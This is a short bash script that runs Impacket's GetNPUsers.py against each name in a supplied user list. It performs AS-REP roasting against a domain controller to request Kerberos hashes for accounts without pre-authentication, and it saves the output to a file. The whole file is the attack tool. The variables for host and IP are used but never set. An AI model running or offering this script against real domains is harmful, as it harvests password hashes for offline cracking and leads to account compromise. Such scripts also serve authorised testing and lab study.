#!/bin/bash
userfile=$1
outfile=$2
if [[ -n $userfile && -n $outfile ]]
then
        file=$(cat ${userfile})
        for name in $file
        do
                users+=("${name}")
        done
        for user in "${users[@]}"
        do
                output=$(python3 /opt/impacket/examples/GetNPUsers.py ${hostname}/${user} -dc-ip $ip -no-pass -request)    
                echo -e "\n${output}\n"
                echo -e "\n${output}\n" >> $outfile
        done
else
        echo "Userfile or Outfile not specified..."
fi
